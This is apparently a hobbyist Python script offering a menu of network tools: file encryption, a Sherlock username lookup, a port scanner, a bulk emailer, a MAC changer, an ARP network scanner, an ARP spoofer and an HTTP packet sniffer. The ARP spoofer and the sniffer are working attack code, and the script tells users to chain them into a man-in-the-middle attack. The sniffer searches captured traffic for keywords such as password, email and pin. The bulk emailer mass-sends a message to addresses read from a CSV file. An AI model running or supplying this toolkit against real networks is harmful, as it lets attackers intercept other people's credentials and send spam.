from cryptography.fernet import Fernet
import socket
import subprocess
import sys
import os 
from datetime import datetime
from colorama import Fore, Back, Style
import csv
from email.message import EmailMessage
import smtplib
import re
import scapy.all as scapy
import time
import scapy_http.http as http
def encryption_fernet():
    decrpt_or_encrpt = input('do you want to decrypt or encrypt the file(e/d):')
    if decrpt_or_encrpt == 'e':
        file_name = input('enter path or file name:')
        key = Fernet.generate_key()
        with open('filekey.key', 'wb') as filekey:
            filekey.write(key)
        with open('filekey.key', 'rb') as filekey:
            key = filekey.read()
        fernet = Fernet(key)
        with open(file_name, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    elif decrpt_or_encrpt == 'd':
        file_name = input('enter path or file name:')
        key = input('Enter key:')
        fernet = Fernet(key)
        with open(file_name, 'rb') as enc_file:
            encrypted = enc_file.read()
        decrypted = fernet.decrypt(encrypted)

        with open(file_name, 'wb') as dec_file:
            dec_file.write(decrypted)
def port_scanner():
    subprocess.call('clear', shell=True)
    remoteServer    = input('Enter a remote host to scan: ')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    print ('-' * 60)
    print (Fore.YELLOW,'Please wait, scanning remote host', remoteServerIP)
    print ('-' * 60)
    t1 = datetime.now()
    try:
        for port in range(1,1025):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                print (Fore.LIGHTGREEN_EX,'Port {}: 	 Open'.format(port))
    except KeyboardInterrupt:
        print (Fore.RED,'You pressed Ctrl+C')
        sys.exit()

    except socket.gaierror:
        print (Fore.Red,'Hostname could not be resolved. Exiting')
        sys.exit()

    except socket.error:
        print (Fore.RED,'Couldnt connect to server')
        sys.exit()
    t2 = datetime.now()
    total =  t2 - t1
    print (Fore.YELLOW,'Scanning Completed in: ', total)
def sherlock():
    print(Fore.YELLOW,'making sure that sherlock is installed...'  )
    if os.path.isfile('sherlock') == True:
        usr_name= input(Fore.LIGHTGREEN_EX,'enter username you want to search: ')
        subprocess.call('sherlock ' , usr_name, shell = True)
    elif os.path.isfile('sherlock') == False:
        print(Fore.LIGHTGREEN_EX,'downloading sherlock...')
        subprocess.call('git clone https://github.com/sherlock-project/sherlock.git', shell = True)
        subprocess.call('cd sherlock', shell = True)
        print(Fore.LIGHTGREEN_EX,'installing required libraries...')
        subprocess.call('pip install -r requirements.txt', shell = True)
        usr_name= input('enter username you want to search: ')
        subprocess.call('sherlock ' + usr_name, shell = True)
    else:
        print('error')
def bulk_email():
    print(Fore.LIGHTGREEN_EX, '-')
    s = smtplib.SMTP('smtp.gmail.com', 587)
    email_address = input('enter sender email: ')
    email_pass = input('enter password:')
    print(Fore.LIGHTGREEN_EX, '-')
    s.ehlo()
    # start TLS for security
    s.starttls()
    s.ehlo()
    # Authentication
    print(Fore.YELLOW, '--------------')
    print(Fore.YELLOW,'logged in...')
    print(Fore.YELLOW, '--------------')
    # message to be sent
    print(Fore.LIGHTGREEN_EX, '-')
    subject = input('enter subject: ')
    body = input('enter your body:')
    

    message = EmailMessage()
    message.set_content(body)
    message['Subject'] = subject
    emails = input('enter filename or path to emails csv file:')
    print(Fore.LIGHTGREEN_EX, '-')
    with open(emails, newline='') as csvfile:
        spamreader = csv.reader(csvfile, delimiter=' ', quotechar='|')
        for email in spamreader:
            s.send_message(message,email_address, email[0])
            print('Send To ' + email[0])
    s.quit()
        # terminating the session
       
    print(Fore.YELLOW, '--------------')
    print('sent')
    print(Fore.YELLOW, '--------------')
def mac_changer():
    print(Fore.LIGHTGREEN_EX,'[-] Please enter a valid MAC Address')
    new_mac = input('enter new mac address: ')
    interface = input('enter interface name: ')
    print('\n[+] Changing the MAC Address to', new_mac)
    subprocess.call(['sudo', 'ifconfig', interface, 'down'])
    subprocess.call(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
    subprocess.call(['sudo', 'ifconfig', interface, 'up'])
    ifconfig_result = subprocess.check_output(['ifconfig', interface])
    ifconfig_results_search = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', ifconfig_result.decode('utf-8'))
    if ifconfig_results_search:
        print(Fore.LIGHTGREEN_EX, 'the MAC is changed to',ifconfig_results_search.group(0))
    else:
        print(Fore.LIGHTRED_EX, '[-] could not find mac address')
def network_scanner():
    ip_r = input('enter ip range:')
    arp_broadcast = scapy.ARP(pdst = ip_r)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_broadcast
    answered_list,un= scapy.srp(arp_request_broadcast, timeout=1,verbose = False)   
    clients_list = []
    print('IP\t\t\tMAC ADDRESS\n---------------------------------------------------------')
    for i in answered_list:
        client_dict= {'ip': i[1].psrc, 'mac': i[1].hwsrc}
        clients_list.append(client_dict)
    result_list = clients_list
    for i in result_list:
        
        print(i['ip'], '\t\t', i['mac'])
def arp_spoof():
    sent_packets = 0
    target_ip = input('enter target ip:')
    router_ip= input('enter router ip:')
    print(Fore.LIGHTBLUE_EX," note:use packet sniffer with it for intercepting and viwing all packets")
    def get_mac(ip):
        mac = "xx"
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
            mac = answered_list[0][1].hwsrc
        except:
            pass
        finally:
            return mac
    def spoof(t_ip, s_ip):
        t_mac = get_mac(t_ip)
        packet = scapy.ARP(op=2, pdst =t_ip, hwdst=t_mac, psrc =s_ip  )
        scapy.send(packet, verbose= False)
    def restore(router_ip, source_ip):
        router_mac = get_mac(router_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst =source_ip, hwdst = source_mac, psrc =router_ip, hwsrc =router_mac )
        scapy.send(packet, verbose = False, count = 5)
    try:
        while True:
            spoof(target_ip, router_ip)
            spoof(router_ip,target_ip)
            sent_packets = sent_packets + 2      
            print(Fore.MAGENTA,'\r[+] Packets Sent: ' + str(sent_packets), end=' ')                               
            time.sleep(2)            
    except KeyboardInterrupt:
        print(Fore.LIGHTBLUE_EX,'\ncleaning up/restoring arp table')
        restore(target_ip, router_ip)
        restore(router_ip, target_ip)
        print(Fore.LIGHTRED_EX,'\n[-] detected CTRL + C... EXITING')



def packet_sniffer():
    print(Fore.LIGHTBLUE_EX,"NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results")
    print(Fore.RED, 'NOTE: THIS IS FOR HTTP SITES ONLY, AND SCANS ONLY HTTP LAYERS,will add https bypassing soon')
    print(Fore.GREEN, '-')
    interface = input("enter the interface you want to sniff:")
    print(Fore.LIGHTMAGENTA_EX, '-')
    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
    
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            print('url -->',str(url))
    
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keyword = ["email", "password", 'unames', "username", "pass", 'passcode', 'pin', ' phno', 'phone']
                for i in keyword:
                    if i.encode() in load:
                        print(Fore.GREEN, '-')
                        print('username/password -->',load) 
                        print(Fore.MAGENTA, '-')

    scapy.sniff(iface=interface, store=False, prn=process_packet)
 
try:
    while True:
        print(Fore.LIGHTYELLOW_EX, '-------------------------------------')
        print(Fore.LIGHTGREEN_EX, '1. file encryption/decryption')
        print(Fore.LIGHTGREEN_EX, '2. sherlock')
        print(Fore.LIGHTGREEN_EX, '3.port scanner')
        print(Fore.LIGHTGREEN_EX, '4. mass emailer')
        print(Fore.LIGHTGREEN_EX, '5.mac changer')
        print(Fore.LIGHTGREEN_EX,'6. network scanner')
        print(Fore.LIGHTGREEN_EX, '7. arp spoofer')
        print(Fore.LIGHTGREEN_EX, '8.packet sniffer')
        print(Fore.LIGHTRED_EX,'input exit to exit')
        print(Fore.LIGHTGREEN_EX,'-')
        
        inpt=input('enter choice:')
        if inpt == '1':
            encryption_fernet()
        elif inpt == '2':
            sherlock()
        elif inpt == '3':
            port_scanner()
        elif inpt == '4':
            bulk_email()
        elif inpt == '5':
            mac_changer()
        elif inpt == '6':
            network_scanner()
        elif inpt == "7":
            arp_spoof()
        elif inpt == '8':
            packet_sniffer()
        elif inpt == 'exit':
            print(Fore.LIGHTRED_EX, 'cya!')
            break
        else:
            print(Fore.LIGHTRED_EX, 'error')
except KeyboardInterrupt:
    print(Fore.LIGHTRED_EX,'\nCTRL +C  detected... exiting')
